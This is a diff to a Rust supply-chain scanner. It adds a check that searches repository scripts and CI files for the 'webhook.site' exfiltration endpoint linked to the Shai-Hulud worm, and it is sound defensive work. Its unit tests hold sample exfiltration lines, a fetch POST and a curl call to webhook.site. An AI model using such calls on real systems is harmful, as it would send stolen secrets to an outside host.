@@ -15,6 +15,17 @@ const IOC_FILENAMES: &[&str] = &[
 
 const SKIP_DIRS: &[&str] = &["node_modules", "target", ".git"];
 
+// Content indicators of secret exfiltration, applied to repo files the worm
+// tends to drop (CI workflows, helper scripts). `webhook.site` is a documented
+// Shai-Hulud exfil endpoint. Kept deliberately tiny — precision over recall, so
+// a hit is worth a human's attention rather than noise.
+const EXFIL_INDICATORS: &[&str] = &["webhook.site"];
+
+// Only read files that plausibly carry a dropped payload. Skips lockfiles,
+// binaries, and large generated bundles.
+const CARRIER_EXTS: &[&str] = &["js", "cjs", "mjs", "ts", "yml", "yaml", "sh", "ps1"];
+const MAX_SCAN_BYTES: u64 = 2_000_000;
+
 pub fn scan_ioc_files(root: &Path) -> Result<Vec<PathBuf>> {
     let mut found = Vec::new();
     let walker = WalkDir::new(root).into_iter().filter_entry(|e| {
@@ -34,6 +45,52 @@ pub fn scan_ioc_files(root: &Path) -> Result<Vec<PathBuf>> {
         }
     }
     Ok(found)
+}
+
+// Scans the same repo files (node_modules excluded) for known exfil endpoints
+// in their content. Requires no installed dependencies — it targets artifacts
+// the worm writes into the repo, not the dependency tree.
+pub fn scan_exfil_indicators(root: &Path) -> Result<Vec<(PathBuf, String)>> {
+    let mut found = Vec::new();
+    let walker = WalkDir::new(root).into_iter().filter_entry(|e| {
+        if !e.file_type().is_dir() {
+            return true;
+        }
+        let n = e.file_name().to_string_lossy();
+        !SKIP_DIRS.iter().any(|s| *s == n)
+    });
+    for entry in walker.filter_map(|e| e.ok()) {
+        if !entry.file_type().is_file() {
+            continue;
+        }
+        let path = entry.path();
+        let ext = path
+            .extension()
+            .and_then(|e| e.to_str())
+            .unwrap_or("")
+            .to_lowercase();
+        if !CARRIER_EXTS.iter().any(|c| *c == ext) {
+            continue;
+        }
+        if entry.metadata().map(|m| m.len()).unwrap_or(u64::MAX) > MAX_SCAN_BYTES {
+            continue;
+        }
+        let Ok(text) = std::fs::read_to_string(path) else {
+            continue;
+        };
+        if let Some(ind) = content_indicator(&text) {
+            found.push((entry.into_path(), ind.to_string()));
+        }
+    }
+    Ok(found)
+}
+
+fn content_indicator(text: &str) -> Option<&'static str> {
+    let lowered = text.to_lowercase();
+    EXFIL_INDICATORS
+        .iter()
+        .copied()
+        .find(|ind| lowered.contains(*ind))
 }
 
 pub fn scan_claude_hooks() -> Result<Vec<String>> {
@@ -71,4 +128,27 @@ pub fn scan_claude_hooks() -> Result<Vec<String>> {
         }
     }
     Ok(suspicious)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn content_indicator_matches_known_endpoint() {
+        assert_eq!(
+            content_indicator("fetch('https://webhook.site/abc-123', {method:'POST'})"),
+            Some("webhook.site")
+        );
+        // case-insensitive
+        assert_eq!(
+            content_indicator("curl https://WEBHOOK.SITE/x"),
+            Some("webhook.site")
+        );
+    }
+
+    #[test]
+    fn content_indicator_ignores_clean_code() {
+        assert_eq!(content_indicator("const x = require('lodash')"), None);
+    }
 }
